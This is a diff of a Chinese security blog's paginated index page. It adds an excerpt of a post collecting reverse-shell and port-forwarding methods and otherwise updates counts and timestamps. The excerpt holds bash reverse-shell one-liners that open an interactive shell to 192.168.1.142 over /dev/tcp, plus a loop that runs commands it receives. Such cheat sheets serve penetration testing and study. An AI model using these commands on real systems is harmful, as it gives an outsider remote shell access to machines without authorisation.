@@ -308,7 +308,7 @@
       
     
 
-    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br/>归档<span class="badge">90</span></a>
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br/>归档<span class="badge">91</span></a>
 
   </li>
         
@@ -410,6 +410,199 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://hacktech.cn/2018/08/23/the-code-reverse-shell-and-port-forward.html"/>
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Akkuman"/>
+      <meta itemprop="description" content="人若无名，便可专心练剑。"/>
+      <meta itemprop="image" content="/pic/avatar.png"/>
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Akkuman Blog"/>
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2018/08/23/the-code-reverse-shell-and-port-forward.html" class="post-title-link" itemprop="url">反弹shell以及端口转发的方法收集</a>
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2018-08-23 16:03:29" itemprop="dateCreated datePublished" datetime="2018-08-23T16:03:29+08:00">2018-08-23</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-05-23 14:42:08" itemprop="dateModified" datetime="2019-05-23T14:42:08+08:00">2019-05-23</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Hacker/" itemprop="url" rel="index"><span itemprop="name">Hacker</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+              
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+            
+                <span class="post-meta-item-text">评论数：</span>
+                <a href="/2018/08/23/the-code-reverse-shell-and-port-forward.html#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2018/08/23/the-code-reverse-shell-and-port-forward.html" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <h2 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.1.142/80 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span> 5&lt;&gt;/dev/tcp/192.168.1.142/80</span><br><span class="line">cat &lt;&amp;5 | <span class="keyword">while</span> <span class="built_in">read</span> line; <span class="keyword">do</span> <span class="variable">$line</span> 2&gt;&amp;5 &gt;&amp;5; <span class="keyword">done</span> </span><br><span class="line"><span class="comment"># or:</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">read</span> line 0&lt;&amp;5; <span class="keyword">do</span> <span class="variable">$line</span> 2&gt;&amp;5 &gt;&amp;5; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+          <!--noindex-->
+          
+            <div class="post-button text-center">
+              <a class="btn" href="/2018/08/23/the-code-reverse-shell-and-port-forward.html#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://hacktech.cn/2018/08/22/ink-create-md.html"/>
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -472,7 +665,7 @@
                 
                   <span class="post-meta-item-text">更新于</span>
                 
-                <time title="修改时间：2019-05-23 14:05:23" itemprop="dateModified" datetime="2019-05-23T14:05:23+08:00">2019-05-23</time>
+                <time title="修改时间：2019-05-23 14:42:08" itemprop="dateModified" datetime="2019-05-23T14:42:08+08:00">2019-05-23</time>
               
             
           </span>
@@ -665,7 +858,7 @@
                 
                   <span class="post-meta-item-text">更新于</span>
                 
-                <time title="修改时间：2019-05-23 14:05:23" itemprop="dateModified" datetime="2019-05-23T14:05:23+08:00">2019-05-23</time>
+                <time title="修改时间：2019-05-23 14:42:08" itemprop="dateModified" datetime="2019-05-23T14:42:08+08:00">2019-05-23</time>
               
             
           </span>
@@ -857,7 +1050,7 @@
                 
                   <span class="post-meta-item-text">更新于</span>
                 
-                <time title="修改时间：2019-05-23 14:05:23" itemprop="dateModified" datetime="2019-05-23T14:05:23+08:00">2019-05-23</time>
+                <time title="修改时间：2019-05-23 14:42:08" itemprop="dateModified" datetime="2019-05-23T14:42:08+08:00">2019-05-23</time>
               
             
           </span>
@@ -1051,7 +1244,7 @@
                 
                   <span class="post-meta-item-text">更新于</span>
                 
-                <time title="修改时间：2019-05-23 14:05:23" itemprop="dateModified" datetime="2019-05-23T14:05:23+08:00">2019-05-23</time>
+                <time title="修改时间：2019-05-23 14:42:08" itemprop="dateModified" datetime="2019-05-23T14:42:08+08:00">2019-05-23</time>
               
             
           </span>
@@ -1243,7 +1436,7 @@
                 
                   <span class="post-meta-item-text">更新于</span>
                 
-                <time title="修改时间：2019-05-23 14:05:23" itemprop="dateModified" datetime="2019-05-23T14:05:23+08:00">2019-05-23</time>
+                <time title="修改时间：2019-05-23 14:42:08" itemprop="dateModified" datetime="2019-05-23T14:42:08+08:00">2019-05-23</time>
               
             
           </span>
@@ -1436,7 +1629,7 @@
                 
                   <span class="post-meta-item-text">更新于</span>
                 
-                <time title="修改时间：2019-05-23 14:05:23" itemprop="dateModified" datetime="2019-05-23T14:05:23+08:00">2019-05-23</time>
+                <time title="修改时间：2019-05-23 14:42:08" itemprop="dateModified" datetime="2019-05-23T14:42:08+08:00">2019-05-23</time>
               
             
           </span>
@@ -1628,7 +1821,7 @@
                 
                   <span class="post-meta-item-text">更新于</span>
                 
-                <time title="修改时间：2019-05-23 14:05:23" itemprop="dateModified" datetime="2019-05-23T14:05:23+08:00">2019-05-23</time>
+                <time title="修改时间：2019-05-23 14:42:08" itemprop="dateModified" datetime="2019-05-23T14:42:08+08:00">2019-05-23</time>
               
             
           </span>
@@ -1820,7 +2013,7 @@
                 
                   <span class="post-meta-item-text">更新于</span>
                 
-                <time title="修改时间：2019-05-23 14:05:23" itemprop="dateModified" datetime="2019-05-23T14:05:23+08:00">2019-05-23</time>
+                <time title="修改时间：2019-05-23 14:42:08" itemprop="dateModified" datetime="2019-05-23T14:42:08+08:00">2019-05-23</time>
               
             
           </span>
@@ -2012,7 +2205,7 @@
                 
                   <span class="post-meta-item-text">更新于</span>
                 
-                <time title="修改时间：2019-05-23 14:05:23" itemprop="dateModified" datetime="2019-05-23T14:05:23+08:00">2019-05-23</time>
+                <time title="修改时间：2019-05-23 14:42:08" itemprop="dateModified" datetime="2019-05-23T14:42:08+08:00">2019-05-23</time>
               
             
           </span>
@@ -2128,203 +2321,11 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://hacktech.cn/2018/02/09/Win32ASM7-Mouse-input-msg.html"/>
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Akkuman"/>
-      <meta itemprop="description" content="人若无名，便可专心练剑。"/>
-      <meta itemprop="image" content="/pic/avatar.png"/>
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Akkuman Blog"/>
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2018/02/09/Win32ASM7-Mouse-input-msg.html" class="post-title-link" itemprop="url">Win32汇编学习(7)：鼠标输入消息</a>
-              
-            
-          </h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2018-02-09 22:29:19" itemprop="dateCreated datePublished" datetime="2018-02-09T22:29:19+08:00">2018-02-09</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">更新于</span>
-                
-                <time title="修改时间：2019-05-23 14:05:23" itemprop="dateModified" datetime="2019-05-23T14:05:23+08:00">2019-05-23</time>
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/汇编-ASM/" itemprop="url" rel="index"><span itemprop="name">汇编(ASM)</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-            
-              
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-            
-                <span class="post-meta-item-text">评论数：</span>
-                <a href="/2018/02/09/Win32ASM7-Mouse-input-msg.html#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2018/02/09/Win32ASM7-Mouse-input-msg.html" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <p>这次我们将学习如何在我们的窗口过程函数中处理鼠标按键消息。例子演示了如何等待鼠标左键按下消息，我们将在按下的位置显示一个字符串。<br>
-          <!--noindex-->
-          
-            <div class="post-button text-center">
-              <a class="btn" href="/2018/02/09/Win32ASM7-Mouse-input-msg.html#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
@@ -2370,7 +2371,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">90</span>
+                    <span class="site-state-item-count">91</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
